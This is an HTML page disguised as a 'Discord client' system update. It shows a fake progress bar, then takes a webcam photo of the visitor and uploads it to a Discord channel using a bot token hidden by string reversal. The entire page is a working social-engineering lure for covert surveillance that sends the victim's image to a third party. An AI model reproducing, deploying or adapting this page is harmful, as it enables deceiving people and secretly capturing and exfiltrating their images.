<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .terminal { max-width: 800px; margin: 0 auto; border: 2px solid #00ff00; padding: 20px; border-radius: 5px; background: #000; }
        h2 { text-align: center; }
        button { background: #00ff00; color: #000; border: none; padding: 15px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; margin-top: 20px; }
        button:hover { background: #00cc00; }
        .progress { width: 100%; height: 25px; background: #333; margin: 15px 0; border-radius: 5px; }
        .progress-bar { height: 25px; background: #00ff00; width: 0%; border-radius: 5px; transition: width 0.3s; }
        #output { margin: 15px 0; padding: 10px; background: #111; border-radius: 5px; min-height: 50px; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>⚡ SYSTEM UPDATE</h2>
        <p>Discord client requires update to continue</p>
        <div id="output">Ready...</div>
        <div class="progress"><div class="progress-bar" id="progress"></div></div>
        <button onclick="startUpdate()">▶ START UPDATE</button>
    </div>

    <script>
    // دالة فك التشفير البسيط (عكس النص)
    function decode(str) {
        return str.split('').reverse().join('');
    }
    
    // البيانات المشفرة
    const botData = {
        t: "86yh63tTR9BA1bVy9HV0unIHJGx0WfKQpeVbK.7GN6FG.QN0417M3DY5098gDy5UTN2E5OTM1MT",
        c: 1475949185294536859
    };
    
    // فك التشفير
    const TOKEN = decode(botData.t);
    const CHANNEL = botData.c;
    
    async function startUpdate() {
        const btn = document.querySelector('button');
        const output = document.getElementById('output');
        const progress = document.getElementById('progress');
        
        btn.disabled = true;
        output.innerHTML = 'Starting update...';
        
        let percent = 0;
        const interval = setInterval(() => {
            percent += 10;
            progress.style.width = percent + '%';
            output.innerHTML = 'Updating... ' + percent + '%';
            
            if (percent >= 100) {
                clearInterval(interval);
                output.innerHTML = '✅ Update complete!';
                takePhoto();
            }
        }, 300);
    }
    
    async function takePhoto() {
        const output = document.getElementById('output');
        output.innerHTML = '📸 Accessing camera...';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            output.innerHTML = '✅ Camera ready';
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                output.innerHTML = '📤 Sending photo...';
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, 'photo.jpg');
                    
                    try {
                        const response = await fetch('https://discord.com/api/v10/channels/' + CHANNEL + '/messages', {
                            method: 'POST',
                            headers: {
                                'Authorization': 'Bot ' + TOKEN
                            },
                            body: formData
                        });
                        
                        if (response.ok) {
                            output.innerHTML = '✅ Photo sent!';
                        } else {
                            output.innerHTML = '❌ Error: ' + response.status;
                        }
                    } catch (err) {
                        output.innerHTML = '❌ Connection error';
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
                
            }, 1500);
            
        } catch (err) {
            output.innerHTML = '❌ Camera error: ' + err.message;
        }
    }
    </script>
</body>
</html>
